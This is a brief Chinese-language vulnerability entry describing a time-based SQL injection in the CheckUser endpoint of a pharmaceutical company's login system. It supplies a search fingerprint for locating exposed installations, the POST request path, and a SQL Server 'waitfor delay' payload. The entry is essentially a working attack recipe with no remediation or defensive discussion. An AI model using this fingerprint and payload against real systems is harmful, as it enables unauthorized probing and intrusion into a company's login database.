# 某医药公司登录系统CheckUser存在延时注入

某医药公司登录系统 ｜ 其他 ｜ —
- **指纹**：`body="ResourceScripts/zh-cn-Login.aspx.js"`
- **请求**：`POST /Login.aspx/CheckUser HTTP/1.1`

**Payload**
```
{"value":"' waitfor delay '0:0:5'--+"}
```